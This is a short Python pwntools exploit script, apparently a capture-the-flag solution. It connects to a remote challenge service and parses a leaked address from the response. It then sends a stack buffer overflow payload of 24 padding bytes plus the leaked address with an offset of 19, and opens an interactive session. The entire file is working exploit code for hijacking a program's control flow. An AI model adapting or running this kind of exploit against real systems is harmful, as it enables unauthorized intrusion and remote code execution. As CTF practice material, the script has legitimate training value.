from pwn import *

p = remote('server.execve.org',2101)
leak = int(p.recvline().split(' ')[5].replace('\n',''),16)

goal = leak + 19

buf = 24 * 'a'
payload = ''
payload += buf
payload += p64(goal)
p.sendline(payload)
p.interactive()
print hex(leak)